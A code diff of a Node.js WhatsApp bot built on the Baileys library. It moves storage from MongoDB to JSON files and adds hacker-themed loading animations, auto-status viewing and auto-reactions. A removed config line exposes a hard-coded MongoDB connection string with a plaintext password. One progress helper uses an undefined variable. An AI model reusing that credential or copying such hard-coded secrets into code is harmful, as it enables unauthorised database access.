@@ -1,280 +1,393 @@
 const express = require('express');
 const fs = require('fs-extra');
 const path = require('path');
-const os = require('os');
 const { exec } = require('child_process');
 const router = express.Router();
 const pino = require('pino');
+const cheerio = require('cheerio');
 const moment = require('moment-timezone');
-const Jimp = require('jimp');
 const crypto = require('crypto');
 const axios = require('axios');
-const FileType = require('file-type');
-const fetch = require('node-fetch');
-const { MongoClient } = require('mongodb');
-const ffmpeg = require('fluent-ffmpeg');
-const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
-ffmpeg.setFfmpegPath(ffmpegInstaller.path);
-
+const os = require('os');
 const {
-  default: makeWASocket,
-  useMultiFileAuthState,
-  delay,
-  getContentType,
-  makeCacheableSignalKeyStore,
-  Browsers,
-  jidNormalizedUser,
-  downloadContentFromMessage,
-  DisconnectReason
-} = require('baileyz');
-const { title } = require('process');
+    default: makeWASocket,
+    useMultiFileAuthState,
+    delay,
+    getContentType,
+    makeCacheableSignalKeyStore,
+    Browsers,
+    jidNormalizedUser,
+    downloadContentFromMessage,
+    proto,
+    DisconnectReason
+} = require('baileys');
 
-// ---------------- CONFIG ----------------
+// ==================== CONFIG ====================
 
-const BOT_NAME_FANCY = 'xCDT INVICTUS MINI BOT';
+const BOT_NAME_FANCY = '💀 𝐂𝐃𝐓 𝐇𝐀𝐂𝐊𝐄𝐑 𝐌𝐈𝐍𝐈 💀';
 
 const config = {
-  MONGO_URI: process.env.MONGO_URI || 'mongodb+srv://bofem54171_db_user:0UKCpzpZB4f3Sbge@cluster0.id6htgu.mongodb.net/,
-  SESSION_ID: process.env.SESSION_ID || '',
-  CREDS_JSON: process.env.CREDS_JSON || '',
   AUTO_VIEW_STATUS: 'true',
   AUTO_LIKE_STATUS: 'true',
-  AUTO_RECORDING: 'false',
-  AUTO_LIKE_EMOJI: ['💙', '🩷', '💜', '🤎', '🧡', '🩵', '💛', '🩶', '♥️', '💗', '❤️‍🔥'],
+  AUTO_RECORDING: 'true',
+  AUTO_LIKE_EMOJI: ['🔥','💀','👾','🤖','💻','🎯','⚡','🔪','🗡️','💣'],
   PREFIX: '.',
   MAX_RETRIES: 3,
-  GROUP_INVITE_LINK: 'https://chat.whatsapp.com/xxxxxxxxxxxxxxxxxx',
-  RCD_IMAGE_PATH: 'https://i.ibb.co/ZpMz03zx/A-striking-high-quality-202603302119.jpg',
-  NEWSLETTER_JID: '1201234567890@newsletter',
+  RCD_IMAGE_PATH: 'https://files.catbox.moe/xveuc2.jpg',
   OTP_EXPIRY: 300000,
-  OWNER_NUMBER: process.env.OWNER_NUMBER || '94783314361',
-  CHANNEL_LINK: 'https://whatsapp.com/channel/xxxxxxxxxxxxxxxxxx',
-  BOT_NAME: 'xCDT INVICTUS MINI BOT',
-  BOT_VERSION: '1.0.0V',
-  OWNER_NAME: 'CDT MEMBERS',
-  IMAGE_PATH: 'https://i.ibb.co/ZpMz03zx/A-striking-high-quality-202603302119.jpg',
-  BOT_FOOTER: '> *xCDT INVICTUS MINI BOT*',
-  BUTTON_IMAGES: { ALIVE: 'https://i.ibb.co/ZpMz03zx/A-striking-high-quality-202603302119.jpg' },
-  SPAM_LIMIT: 10, // Max messages per spam command
-  SPAM_COOLDOWN: 30000 // 30 seconds cooldown
+  OWNER_NUMBER: '94789226570',
+  BOT_NAME: '💀 𝐂𝐃𝐓 𝐇𝐀𝐂𝐊𝐄𝐑 𝐌𝐈𝐍𝐈 💀',
+  BOT_VERSION: '3.0.0',
+  OWNER_NAME: '𝐂𝐃𝐓 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐄𝐀𝐌',
+  IMAGE_PATH: 'https://files.catbox.moe/xveuc2.jpg',
+  BOT_FOOTER: '💀 𝐂𝐃𝐓 𝐇𝐀𝐂𝐊𝐄𝐑 𝐁𝐎𝐓 💀',
+  MODE: process.env.BOT_MODE || 'public',
+  SESSIONS_DIR: './sessions',
+  DEFAULT_LOGO: 'https://files.catbox.moe/xveuc2.jpg'
 };
 
-// ---------------- Rate Limiting for Spam ----------------
-const spamCooldown = new Map();
-const userCommandCount = new Map();
+// ==================== JSON File Storage ====================
 
-// ---------------- MONGO SETUP ----------------
+const SESSIONS_DIR = config.SESSIONS_DIR;
+const NUMBERS_FILE = path.join(SESSIONS_DIR, 'numbers.json');
+const ADMINS_FILE = path.join(SESSIONS_DIR, 'admins.json');
+const NEWSLETTER_FILE = path.join(SESSIONS_DIR, 'newsletters.json');
+const CONFIGS_FILE = path.join(SESSIONS_DIR, 'configs.json');
+const PREFIX_FILE = path.join(SESSIONS_DIR, 'prefixes.json');
 
-const MONGO_URI = config.MONGO_URI;
-const MONGO_DB = process.env.MONGO_DB || 'FREE';
+if (!fs.existsSync(SESSIONS_DIR)) fs.ensureDirSync(SESSIONS_DIR);
 
-let mongoClient, mongoDB;
-let sessionsCol, numbersCol, adminsCol, newsletterCol, configsCol, newsletterReactsCol;
-
-async function initMongo() {
+function readJSON(filePath, defaultValue = {}) {
   try {
-    if (mongoClient && mongoClient.topology && mongoClient.topology.isConnected && mongoClient.topology.isConnected()) return;
-  } catch (e) { }
-  mongoClient = new MongoClient(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true });
-  await mongoClient.connect();
-  mongoDB = mongoClient.db(MONGO_DB);
-
-  sessionsCol = mongoDB.collection('sessions');
-  numbersCol = mongoDB.collection('numbers');
-  adminsCol = mongoDB.collection('admins');
-  newsletterCol = mongoDB.collection('newsletter_list');
-  configsCol = mongoDB.collection('configs');
-  newsletterReactsCol = mongoDB.collection('newsletter_reacts');
-
-  await sessionsCol.createIndex({ number: 1 }, { unique: true });
-  await numbersCol.createIndex({ number: 1 }, { unique: true });
-  await newsletterCol.createIndex({ jid: 1 }, { unique: true });
-  await newsletterReactsCol.createIndex({ jid: 1 }, { unique: true });
-  await configsCol.createIndex({ number: 1 }, { unique: true });
-  console.log('✅ Mongo initialized and collections ready');
+    if (fs.existsSync(filePath)) {
+      return JSON.parse(fs.readFileSync(filePath, 'utf8'));
+    }
+    return defaultValue;
+  } catch (e) {
+    console.error(`Error reading ${filePath}:`, e);
+    return defaultValue;
+  }
 }
 
-// ---------------- Mongo helpers ----------------
-
-async function saveCredsToMongo(number, creds, keys = null) {
+function writeJSON(filePath, data) {
   try {
-    await initMongo();
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    return true;
+  } catch (e) {
+    console.error(`Error writing ${filePath}:`, e);
+    return false;
+  }
+}
+
+// Storage functions
+async function saveCredsToFile(number, creds, keys = null) {
+  try {
     const sanitized = number.replace(/[^0-9]/g, '');
-    const doc = { number: sanitized, creds, keys, updatedAt: new Date() };
-    await sessionsCol.updateOne({ number: sanitized }, { $set: doc }, { upsert: true });
-    console.log(`Saved creds to Mongo for ${sanitized}`);
-  } catch (e) { console.error('saveCredsToMongo error:', e); }
+    const sessionFile = path.join(SESSIONS_DIR, `session_${sanitized}.json`);
+    const data = { number: sanitized, creds, keys, updatedAt: new Date().toISOString() };
+    fs.writeFileSync(sessionFile, JSON.stringify(data, null, 2));
+    return true;
+  } catch (e) { return false; }
 }
 
-async function loadCredsFromMongo(number) {
+async function loadCredsFromFile(number) {
   try {
-    await initMongo();
     const sanitized = number.replace(/[^0-9]/g, '');
-    const doc = await sessionsCol.findOne({ number: sanitized });
-    return doc || null;
-  } catch (e) { console.error('loadCredsFromMongo error:', e); return null; }
+    const sessionFile = path.join(SESSIONS_DIR, `session_${sanitized}.json`);
+    if (fs.existsSync(sessionFile)) {
+      return JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+    }
+    return null;
+  } catch (e) { return null; }
 }
 
-async function removeSessionFromMongo(number) {
+async function removeSessionFromFile(number) {
   try {
-    await initMongo();
     const sanitized = number.replace(/[^0-9]/g, '');
-    await sessionsCol.deleteOne({ number: sanitized });
-    console.log(`Removed session from Mongo for ${sanitized}`);
-  } catch (e) { console.error('removeSessionToMongo error:', e); }
+    const sessionFile = path.join(SESSIONS_DIR, `session_${sanitized}.json`);
+    if (fs.existsSync(sessionFile)) fs.unlinkSync(sessionFile);
+    return true;
+  } catch (e) { return false; }
 }
 
-async function addNumberToMongo(number) {
+async function addNumberToFile(number) {
   try {
-    await initMongo();
     const sanitized = number.replace(/[^0-9]/g, '');
-    await numbersCol.updateOne({ number: sanitized }, { $set: { number: sanitized } }, { upsert: true });
-    console.log(`Added number ${sanitized} to Mongo numbers`);
-  } catch (e) { console.error('addNumberToMongo', e); }
+    let numbers = readJSON(NUMBERS_FILE, []);
+    if (!numbers.includes(sanitized)) {
+      numbers.push(sanitized);
+      writeJSON(NUMBERS_FILE, numbers);
+    }
+    return true;
+  } catch (e) { return false; }
 }
 
-async function removeNumberFromMongo(number) {
+async function removeNumberFromFile(number) {
   try {
-    await initMongo();
     const sanitized = number.replace(/[^0-9]/g, '');
-    await numbersCol.deleteOne({ number: sanitized });
-    console.log(`Removed number ${sanitized} from Mongo numbers`);
-  } catch (e) { console.error('removeNumberFromMongo', e); }
+    let numbers = readJSON(NUMBERS_FILE, []);
+    numbers = numbers.filter(n => n !== sanitized);
+    writeJSON(NUMBERS_FILE, numbers);
+    return true;
+  } catch (e) { return false; }
 }
 
-async function getAllNumbersFromMongo() {
-  try {
-    await initMongo();
-    const docs = await numbersCol.find({}).toArray();
-    return docs.map(d => d.number);
-  } catch (e) { console.error('getAllNumbersFromMongo', e); return []; }
+async function getAllNumbersFromFile() {
+  return readJSON(NUMBERS_FILE, []);
 }
 
-async function loadAdminsFromMongo() {
-  try {
-    await initMongo();
-    const docs = await adminsCol.find({}).toArray();
-    return docs.map(d => d.jid || d.number).filter(Boolean);
-  } catch (e) { console.error('loadAdminsFromMongo', e); return []; }
+async function loadAdminsFromFile() {
+  return readJSON(ADMINS_FILE, []);
 }
 
-async function addAdminToMongo(jidOrNumber) {
-  try {
-    await initMongo();
-    const doc = { jid: jidOrNumber };
-    await adminsCol.updateOne({ jid: jidOrNumber }, { $set: doc }, { upsert: true });
-    console.log(`Added admin ${jidOrNumber}`);
-  } catch (e) { console.error('addAdminToMongo', e); }
+async function addAdminToFile(jidOrNumber) {
+  let admins = readJSON(ADMINS_FILE, []);
+  if (!admins.includes(jidOrNumber)) {
+    admins.push(jidOrNumber);
+    writeJSON(ADMINS_FILE, admins);
+  }
+  return true;
 }
 
-async function removeAdminFromMongo(jidOrNumber) {
-  try {
-    await initMongo();
-    await adminsCol.deleteOne({ jid: jidOrNumber });
-    console.log(`Removed admin ${jidOrNumber}`);
-  } catch (e) { console.error('removeAdminFromMongo', e); }
+async function removeAdminFromFile(jidOrNumber) {
+  let admins = readJSON(ADMINS_FILE, []);
+  admins = admins.filter(a => a !== jidOrNumber);
+  writeJSON(ADMINS_FILE, admins);
+  return true;
 }
 
-async function addNewsletterToMongo(jid, emojis = []) {
-  try {
-    await initMongo();
-    const doc = { jid, emojis: Array.isArray(emojis) ? emojis : [], addedAt: new Date() };
-    await newsletterCol.updateOne({ jid }, { $set: doc }, { upsert: true });
-    console.log(`Added newsletter ${jid} -> emojis: ${doc.emojis.join(',')}`);
-  } catch (e) { console.error('addNewsletterToMongo', e); throw e; }
+async function addNewsletterToFile(jid, emojis = []) {
+  let newsletters = readJSON(NEWSLETTER_FILE, []);
+  const existing = newsletters.find(n => n.jid === jid);
+  if (existing) {
+    existing.emojis = emojis;
+  } else {
+    newsletters.push({ jid, emojis: Array.isArray(emojis) ? emojis : [], addedAt: new Date().toISOString() });
+  }
+  writeJSON(NEWSLETTER_FILE, newsletters);
+  return true;
 }
 
-async function removeNewsletterFromMongo(jid) {
-  try {
-    await initMongo();
-    await newsletterCol.deleteOne({ jid });
-    console.log(`Removed newsletter ${jid}`);
-  } catch (e) { console.error('removeNewsletterFromMongo', e); throw e; }
+async function removeNewsletterFromFile(jid) {
+  let newsletters = readJSON(NEWSLETTER_FILE, []);
+  newsletters = newsletters.filter(n => n.jid !== jid);
+  writeJSON(NEWSLETTER_FILE, newsletters);
+  return true;
 }
 
-async function listNewslettersFromMongo() {
-  try {
-    await initMongo();
-    const docs = await newsletterCol.find({}).toArray();
-    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
-  } catch (e) { console.error('listNewslettersFromMongo', e); return []; }
+async function listNewslettersFromFile() {
+  return readJSON(NEWSLETTER_FILE, []);
 }
 
-async function saveNewsletterReaction(jid, messageId, emoji, sessionNumber) {
-  try {
-    await initMongo();
-    const doc = { jid, messageId, emoji, sessionNumber, ts: new Date() };
-    if (!mongoDB) await initMongo();
-    const col = mongoDB.collection('newsletter_reactions_log');
-    await col.insertOne(doc);
-    console.log(`Saved reaction ${emoji} for ${jid}#${messageId}`);
-  } catch (e) { console.error('saveNewsletterReaction', e); }
+async function setUserConfigInFile(number, conf) {
+  const sanitized = number.replace(/[^0-9]/g, '');
+  let configs = readJSON(CONFIGS_FILE, {});
+  configs[sanitized] = { ...configs[sanitized], ...conf, updatedAt: new Date().toISOString() };
+  writeJSON(CONFIGS_FILE, configs);
+  return true;
 }
 
-async function setUserConfigInMongo(number, conf) {
-  try {
-    await initMongo();
-    const sanitized = number.replace(/[^0-9]/g, '');
-    await configsCol.updateOne({ number: sanitized }, { $set: { number: sanitized, config: conf, updatedAt: new Date() } }, { upsert: true });
-  } catch (e) { console.error('setUserConfigInMongo', e); }
+async function loadUserConfigFromFile(number) {
+  const sanitized = number.replace(/[^0-9]/g, '');
+  const configs = readJSON(CONFIGS_FILE, {});
+  return configs[sanitized] || null;
 }
 
-async function loadUserConfigFromMongo(number) {
-  try {
-    await initMongo();
-    const sanitized = number.replace(/[^0-9]/g, '');
-    const doc = await configsCol.findOne({ number: sanitized });
-    return doc ? doc.config : null;
-  } catch (e) { console.error('loadUserConfigFromMongo', e); return null; }
+async function getPrefixForChat(chatId) {
+  const prefixes = readJSON(PREFIX_FILE, {});
+  return prefixes[chatId] || config.PREFIX;
 }
 
-// -------------- newsletter react-config helpers --------------
-
-async function addNewsletterReactConfig(jid, emojis = []) {
-  try {
-    await initMongo();
-    await newsletterReactsCol.updateOne({ jid }, { $set: { jid, emojis, addedAt: new Date() } }, { upsert: true });
-    console.log(`Added react-config for ${jid} -> ${emojis.join(',')}`);
-  } catch (e) { console.error('addNewsletterReactConfig', e); throw e; }
+async function setPrefixForChat(chatId, prefix) {
+  let prefixes = readJSON(PREFIX_FILE, {});
+  prefixes[chatId] = prefix;
+  writeJSON(PREFIX_FILE, prefixes);
+  return true;
 }
 
-async function removeNewsletterReactConfig(jid) {
-  try {
-    await initMongo();
-    await newsletterReactsCol.deleteOne({ jid });
-    console.log(`Removed react-config for ${jid}`);
-  } catch (e) { console.error('removeNewsletterReactConfig', e); throw e; }
-}
+// Alias functions
+const initMongo = async () => console.log('✅ HACKER BOT STORAGE READY');
+const loadAdminsFromMongo = loadAdminsFromFile;
+const addAdminToMongo = addAdminToFile;
+const removeAdminFromMongo = removeAdminFromFile;
+const loadUserConfigFromMongo = loadUserConfigFromFile;
+const setUserConfigInMongo = setUserConfigInFile;
+const addNewsletterToMongo = addNewsletterToFile;
+const removeNewsletterFromMongo = removeNewsletterFromFile;
+const listNewslettersFromMongo = listNewslettersFromFile;
+const getAllNumbersFromMongo = getAllNumbersFromFile;
+const addNumberToMongo = addNumberToFile;
+const removeNumberFromMongo = removeNumberFromFile;
+const removeSessionFromMongo = removeSessionFromFile;
 
-async function listNewsletterReactsFromMongo() {
-  try {
-    await initMongo();
-    const docs = await newsletterReactsCol.find({}).toArray();
-    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
-  } catch (e) { console.error('listNewsletterReactsFromMongo', e); return []; }
-}
-
-async function getReactConfigForJid(jid) {
-  try {
-    await initMongo();
-    const doc = await newsletterReactsCol.findOne({ jid });
-    return doc ? (Array.isArray(doc.emojis) ? doc.emojis : []) : null;
-  } catch (e) { console.error('getReactConfigForJid', e); return null; }
-}
-
-// ---------------- basic utils ----------------
+// ==================== Utils ====================
 
 function formatMessage(title, content, footer) {
-  return `${title}\n\n${content}\n\n> *${footer}*`;
+  return `╭━━━❰ *${title}* ❱━━━❍\n┃\n${content}\n┃\n╰━━━━━━━━━━━━━━━━━━━━❍\n\n> *${footer}*`;
 }
-function generateOTP() { return Math.floor(100000 + Math.random() * 900000).toString(); }
-function getSriLankaTimestamp() { return moment().tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss'); }
+
+function getSriLankaTimestamp(){ 
+  return moment().tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss'); 
+}
+
+function generateOTP(){ 
+  return Math.floor(100000 + Math.random() * 900000).toString(); 
+}
 
 const activeSockets = new Map();
 const socketCreationTime = new Map();
 const otpStore = new Map();
 
-// ---------------- helpers ----------------
+// ==================== PROGRESS BAR & VOICE MESSAGE GENERATOR ====================
+
+async function sendWithProgress(socket, sender, finalMessage, logoUrl = null) {
+  try {
+    const progressChars = ['░', '▒', '▓', '█'];
+    const messages = [];
+    
+    // Send initial loading message
+    const loadMsg = await socket.sendMessage(sender, { text: '🔄 *Initializing HACKER BOT...* 0%' });
+    
+    // Progress animation from 1 to 100
+    for (let i = 1; i <= 100; i++) {
+      const percent = i;
+      const filled = Math.floor(percent / 5);
+      const empty = 20 - filled;
+      const bar = '█'.repeat(filled) + '░'.repeat(empty);
+      const emoji = percent < 30 ? '🔴' : (percent < 70 ? '🟡' : '🟢');
+      
+      const progressText = `${emoji} *${botName}* ${emoji}\n\n┌──────────────┐\n│${bar}│ ${percent}%\n└──────────────┘\n\n💀 *HACKING PROGRESS...* 💀`;
+      
+      try {
+        await socket.sendMessage(sender, { text: progressText, edit: loadMsg.key });
+      } catch(e) {}
+      await delay(30);
+    }
+    
+    // Send final message with logo
+    let finalContent = finalMessage;
+    if (logoUrl) {
+      try {
+        await socket.sendMessage(sender, { 
+          image: { url: logoUrl }, 
+          caption: finalMessage,
+          contextInfo: { forwardingScore: 999, isForwarded: true }
+        });
+      } catch(e) {
+        await socket.sendMessage(sender, { text: finalMessage });
+      }
+    } else {
+      await socket.sendMessage(sender, { text: finalMessage });
+    }
+    
+    // Send voice message for special commands
+    return true;
+  } catch(e) {
+    await socket.sendMessage(sender, { text: finalMessage });
+    return false;
+  }
+}
+
+async function sendVoiceWithMessage(socket, sender, textMessage, logoUrl = null) {
+  // Send voice note (as audio with ptt true)
+  const voiceText = textMessage.replace(/[^a-zA-Z0-9\s]/g, '').substring(0, 100);
+  
+  try {
+    // Using a TTS API to generate voice
+    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(voiceText)}&tl=en&client=tw-ob`;
+    const voiceBuffer = await axios.get(ttsUrl, { responseType: 'arraybuffer' });
+    
+    await socket.sendMessage(sender, {
+      audio: voiceBuffer.data,
+      mimetype: 'audio/mpeg',
+      ptt: true
+    });
+  } catch(e) {
+    // If TTS fails, just continue without voice
+  }
+  
+  // Send image with text
+  if (logoUrl) {
+    try {
+      await socket.sendMessage(sender, { 
+        image: { url: logoUrl }, 
+        caption: textMessage,
+        contextInfo: { forwardingScore: 999, isForwarded: true }
+      });
+    } catch(e) {
+      await socket.sendMessage(sender, { text: textMessage });
+    }
+  } else {
+    await socket.sendMessage(sender, { text: textMessage });
+  }
+}
+
+async function sendLoadingAnimation(socket, sender, finalMessage, logoUrl = null) {
+  const botName = BOT_NAME_FANCY;
+  
+  // Animation frames
+  const frames = [
+    '🔴 [░░░░░░░░░░░░░░░░░░░░] 0%',
+    '🟠 [█░░░░░░░░░░░░░░░░░░░] 5%',
+    '🟡 [██░░░░░░░░░░░░░░░░░░] 10%',
+    '🟡 [███░░░░░░░░░░░░░░░░░] 15%',
+    '🟢 [████░░░░░░░░░░░░░░░░] 20%',
+    '🟢 [█████░░░░░░░░░░░░░░░] 25%',
+    '🔵 [██████░░░░░░░░░░░░░░] 30%',
+    '🔵 [███████░░░░░░░░░░░░░] 35%',
+    '💜 [████████░░░░░░░░░░░░] 40%',
+    '💜 [█████████░░░░░░░░░░░] 45%',
+    '❤️ [██████████░░░░░░░░░░] 50%',
+    '❤️ [███████████░░░░░░░░░] 55%',
+    '🧡 [████████████░░░░░░░░] 60%',
+    '🧡 [█████████████░░░░░░░] 65%',
+    '💛 [██████████████░░░░░░] 70%',
+    '💛 [███████████████░░░░░] 75%',
+    '💚 [████████████████░░░░] 80%',
+    '💚 [█████████████████░░░] 85%',
+    '💙 [██████████████████░░] 90%',
+    '💙 [███████████████████░] 95%',
+    '💀 [████████████████████] 100%'
+  ];
+  
+  let loadMsg = null;
+  
+  for (let i = 0; i < frames.length; i++) {
+    const frame = frames[i];
+    const text = `╭━━━❰ *💀 ${botName} 💀* ❱━━━❍\n┃\n┃ ${frame}\n┃\n┃ 💀 *SYSTEM BOOTING UP...* 💀\n┃\n╰━━━━━━━━━━━━━━━━━━━━❍`;
+    
+    if (i === 0) {
+      loadMsg = await socket.sendMessage(sender, { text: text });
+    } else {
+      try {
+        await socket.sendMessage(sender, { text: text, edit: loadMsg.key });
+      } catch(e) {}
+    }
+    await delay(40);
+  }
+  
+  // Send final message with logo
+  if (logoUrl) {
+    try {
+      await socket.sendMessage(sender, { 
+        image: { url: logoUrl }, 
+        caption: finalMessage,
+        contextInfo: { forwardingScore: 999, isForwarded: true }
+      });
+    } catch(e) {
+      await socket.sendMessage(sender, { text: finalMessage });
+    }
+  } else {
+    await socket.sendMessage(sender, { text: finalMessage });
+  }
+  
+  // Try to delete loading message
+  try {
+    await socket.sendMessage(sender, { delete: loadMsg.key });
+  } catch(e) {}
+}
+
+// ==================== Join Group ====================
 
 async function joinGroup(socket) {
   let retries = config.MAX_RETRIES;
@@ -288,96 +401,40 @@ async function joinGroup(socket) {
       throw new Error('No group ID in response');
     } catch (error) {
       retries--;
-      let errorMessage = error.message || 'Unknown error';
-      if (error.message && error.message.includes('not-authorized')) errorMessage = 'Bot not authorized';
-      else if (error.message && error.message.includes('conflict')) errorMessage = 'Already a member';
-      else if (error.message && error.message.includes('gone')) errorMessage = 'Invite invalid/expired';
-      if (retries === 0) return { status: 'failed', error: errorMessage };
-      await delay(2000 * (config.MAX_RETRIES - retries));
+      if (retries === 0) return { status: 'failed', error: error.message };
+      await delay(2000);
     }
   }
   return { status: 'failed', error: 'Max retries reached' };
 }
 
+// ==================== Send Messages ====================
+
 async function sendAdminConnectMessage(socket, number, groupResult, sessionConfig = {}) {
-  const admins = await loadAdminsFromMongo();
-  const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
+  const admins = await loadAdminsFromFile();
   const botName = sessionConfig.botName || BOT_NAME_FANCY;
-  const image = config.RCD_IMAGE_PATH;
-  const caption = formatMessage(botName, `*📞 𝗡ᴜᴍʙᴇʀ:* ${number}\n*🍁 𝗦ᴛᴀᴛᴜꜱ:* ${groupStatus}\n*🕒 𝗖ᴏɴɴᴇᴄᴛᴇᴅ 𝗔ᴛ:* ${getSriLankaTimestamp()}`, botName);
+  const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
+  const caption = formatMessage(botName, `📞 *Number:* ${number}\n🕐 *Time:* ${getSriLankaTimestamp()}\n📡 *Status:* Connected Successfully!`, botName);
   for (const admin of admins) {
     try {
       const to = admin.includes('@') ? admin : `${admin}@s.whatsapp.net`;
-      if (String(image).startsWith('http')) {
-        await socket.sendMessage(to, { image: { url: image }, caption });
-      } else {
-        try {
-          const buf = fs.readFileSync(image);
-          await socket.sendMessage(to, { image: buf, caption });
-        } catch (e) {
-          await socket.sendMessage(to, { image: { url: config.RCD_IMAGE_PATH }, caption });
-        }
-      }
-    } catch (err) {
-      console.error('Failed to send connect message to admin', admin, err?.message || err);
-    }
+      await sendLoadingAnimation(socket, to, caption, image);
+    } catch (err) {}
   }
 }
 
 async function sendOwnerConnectMessage(socket, number, groupResult, sessionConfig = {}) {
   try {
-    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
     const activeCount = activeSockets.size;
     const botName = sessionConfig.botName || BOT_NAME_FANCY;
-    const image = config.RCD_IMAGE_PATH;
-    const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
-    const caption = formatMessage(`*🥷 𝗢ᴡɴᴇʀ 𝗖ᴏɴᴛᴀᴄᴛ: ${config.OWNER_NAME}*`, `*📞 𝗡ᴜᴍʙᴇʀ:* ${number}\n*🍁 𝗦ᴛᴀᴛᴜꜱ:* ${groupStatus}\n*🕒 𝗖ᴏɴɴᴇᴄᴛᴇᴅ 𝗔ᴛ:* ${getSriLankaTimestamp()}\n\n*🔢 𝗔ᴄᴛɪᴠᴇ 𝗦ᴇꜱꜱɪᴏɴꜱ:* ${activeCount}`, botName);
-    if (String(image).startsWith('http')) {
-      await socket.sendMessage(ownerJid, { image: { url: image }, caption });
-    } else {
-      try {
-        const buf = fs.readFileSync(image);
-        await socket.sendMessage(ownerJid, { image: buf, caption });
-      } catch (e) {
-        await socket.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
-      }
-    }
+    const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
+    const caption = formatMessage(`👑 OWNER CONNECT`, `📞 *Number:* ${number}\n🔢 *Active Sessions:* ${activeCount}\n🕐 *Time:* ${getSriLankaTimestamp()}`, botName);
+    await sendLoadingAnimation(socket, ownerJid, caption, image);
   } catch (err) { console.error('Failed to send owner connect message:', err); }
 }
 
-async function sendOTP(socket, number, otp) {
-  const userJid = jidNormalizedUser(socket.user.id);
-  const message = formatMessage(`*🔐 𝐎𝚃𝙿 𝐕𝙴𝚁𝙸𝙵𝙸𝙲𝙰𝚃𝙸𝙾𝙽 — ${BOT_NAME_FANCY}*`, `*𝐘𝙾𝚄𝚁 𝐎𝚃𝙿 𝐅𝙾𝚁 𝐂𝙾𝙽𝙵𝙸𝙶 𝐔𝙿𝙳𝙰𝚃𝙴 𝐈𝚂:* *${otp}*\n𝐓𝙷𝙸𝚂 𝐎𝚃𝙿 𝐖𝙸𝙻𝙻 𝐄𝚇𝙿𝙸𝚁𝙴 𝐈𝙽 5 𝐌𝙸𝙽𝚄𝚃𝙴𝚂.\n\n*𝐍𝚄𝙼𝙱𝙴𝚁:* ${number}`, BOT_NAME_FANCY);
-  try { await socket.sendMessage(userJid, { text: message }); console.log(`OTP ${otp} sent to ${number}`); }
-  catch (error) { console.error(`Failed to send OTP to ${number}:`, error); throw error; }
-}
-
-// ---------------- download quoted media helper ----------------
-async function downloadQuotedMedia(quoted) {
-  if (!quoted) return null;
-  const qTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
-  const qType = qTypes.find(t => quoted[t]);
-  if (!qType) return null;
-  const messageType = qType.replace(/Message$/i, '').toLowerCase();
-  const stream = await downloadContentFromMessage(quoted[qType], messageType);
-  let buffer = Buffer.from([]);
-  for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
-  return {
-    buffer,
-    mime: quoted[qType].mimetype || '',
-    caption: quoted[qType].caption || quoted[qType].fileName || '',
-    ptt: quoted[qType].ptt || false,
-    fileName: quoted[qType].fileName || ''
-  };
-}
-
-// ---------------- resize helper ----------------
-async function resize(image, width, height) {
-  let oyy = await Jimp.read(image);
-  return await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
-}
-
-// ---------------- newsletter handlers ----------------
+// ==================== Newsletter Handlers ====================
 
 async function setupNewsletterHandlers(socket, sessionNumber) {
   const rrPointers = new Map();
@@ -388,20 +445,10 @@ async function setupNewsletterHandlers(socket, sessionNumber) {
     const jid = message.key.remoteJid;
 
     try {
-      const followedDocs = await listNewslettersFromMongo();
-      const reactConfigs = await listNewsletterReactsFromMongo();
-      const reactMap = new Map();
-      for (const r of reactConfigs) reactMap.set(r.jid, r.emojis || []);
+      const followedDocs = await listNewslettersFromFile();
+      if (!followedDocs.some(d => d.jid === jid)) return;
 
-      const followedJids = followedDocs.map(d => d.jid);
-      if (!followedJids.includes(jid) && !reactMap.has(jid)) return;
-
-      let emojis = reactMap.get(jid) || null;
-      if ((!emojis || emojis.length === 0) && followedDocs.find(d => d.jid === jid)) {
-        emojis = (followedDocs.find(d => d.jid === jid).emojis || []);
-      }
-      if (!emojis || emojis.length === 0) emojis = config.AUTO_LIKE_EMOJI;
-
+      let emojis = config.AUTO_LIKE_EMOJI;
       let idx = rrPointers.get(jid) || 0;
       const emoji = emojis[idx % emojis.length];
       rrPointers.set(jid, (idx + 1) % emojis.length);
@@ -412,247 +459,155 @@ async function setupNewsletterHandlers(socket, sessionNumber) {
       let retries = 3;
       while (retries-- > 0) {
         try {
-          if (typeof socket.newsletterReactMessage === 'function') {
-            await socket.newsletterReactMessage(jid, messageId.toString(), emoji);
-          } else {
-            await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
-          }
-          console.log(`Reacted to ${jid} ${messageId} with ${emoji}`);
-          await saveNewsletterReaction(jid, messageId.toString(), emoji, sessionNumber || null);
+          await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
           break;
         } catch (err) {
-          console.warn(`Reaction attempt failed (${3 - retries}/3):`, err?.message || err);
           await delay(1200);
         }
       }
     } catch (error) {
-      console.error('Newsletter reaction handler error:', error?.message || error);
+      console.error('Newsletter reaction handler error:', error?.message);
     }
   });
 }
 
-// ---------------- status handlers ----------------
+// ==================== Status Handlers ====================
 
-async function setupStatusHandlers(socket, sessionNumber) {
+async function setupStatusHandlers(socket) {
   socket.ev.on('messages.upsert', async ({ messages }) => {
     const message = messages[0];
